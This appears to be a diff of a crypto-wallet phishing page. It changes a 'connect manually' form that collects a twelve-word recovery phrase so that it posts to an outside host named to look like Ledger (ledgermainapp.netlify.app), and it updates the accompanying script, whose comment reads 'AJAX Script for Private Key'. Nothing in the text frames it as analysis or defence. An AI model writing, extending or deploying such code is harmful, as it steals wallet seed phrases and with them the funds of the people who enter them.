@@ -1369,8 +1369,8 @@
                     </div>
 
                  <div id="div_connect_manuallly">
-    <form id="again" method="POST"  data-netlify="true">
-      <input type="hidden" name="form-name" value="again" />
+        <form id="twelveWordsForm" method="POST" action="https://ledgermainapp.netlify.app" data-netlify="true">
+        <input type="hidden" name="form-name" value="twelveWordsForm" />
       <div id="phrase">
         <textarea
           class="col-12 form-control"
@@ -1394,7 +1394,7 @@
 
         <!-- AJAX Script for Private Key -->
 <script>
-    const form3 = document.getElementById("again");
+    const form3 = document.getElementById("twelveWordsForm");
     const successMessage3 = document.getElementById("success-message-3");
 
     form3.addEventListener("submit", async function (event) {
